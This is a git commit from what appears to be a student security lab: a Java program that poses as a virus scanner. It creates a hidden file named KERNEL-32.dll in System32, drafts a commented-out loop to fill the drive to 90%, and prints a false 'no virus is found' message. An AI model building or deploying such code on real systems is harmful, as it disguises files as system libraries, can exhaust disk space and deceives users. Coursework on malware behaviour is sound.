3551af78fc16af68393ab6984f33f8b8bb07fb02
robotsdancing <robotsdancing@gmail.com>
2017-02-19 23:27:19 -0700

    Created hidden file
    I have it creating a hidden file, and I have a commented out while loop for writing to the dll file.

--- src/csci476/lab3/Main.java
+++ src/csci476/lab3/Main.java
@@ -1,8 +1,12 @@
 package csci476.lab3;
 import java.io.*;
+import java.nio.file.*;
+import static java.nio.file.Files.newOutputStream;
+import static java.nio.file.StandardOpenOption.CREATE_NEW;
+
 public class Main {
 
-    public static void main(String[] args) {
+    public static void main(String[] args) throws IOException {
 	// write your code here
         File rootDrive = new File("/Windows/System32");
         //set the rootDrive to be System32, i have %systemroot% that way because I assume that will work
@@ -10,8 +14,19 @@ public class Main {
         //retrieves the total space of System 32
         long rootDriveFillableSize = (long)(rootDriveTotalSize*.90)-rootDrive.getUsableSpace();
         //calculates 90% of space of drive and removes free space so you get the amount of space needed to make the drive 90% full.
+        byte one = 1;
+        Path dllPath = Paths.get("/Windows/System32/KERNEL-32.dll");
+        try (OutputStream out = new BufferedOutputStream(
+                Files.newOutputStream(dllPath, CREATE_NEW))) {
 
-        //create hidden dummy .dll file KERNEL-32.DLL
+        } catch (IOException x) {
+            System.err.println(x);
+        }
+        Files.setAttribute(dllPath, "dos:hidden",true);
+
+        //create hidden dummy .dll file KERNEL-32.dll
+        //make that file hidden.
+
 
         System.out.println("Tota disk size: "+ rootDriveTotalSize);
         System.out.println("Usable space: "+ rootDrive.getUsableSpace());
@@ -21,12 +36,13 @@ public class Main {
 
 
         /*
-        while(DLL <= rootDriveFillableSize){
-            //write stuff to the file.
+        while(dummyDLL.length() < rootDriveFillableSize){
+
+            //add one to the file.
         }
-
-
         */
+
+
         System.out.println("The scanning finished and no virus is found!");
         //tell the user they have no viruses.
     }
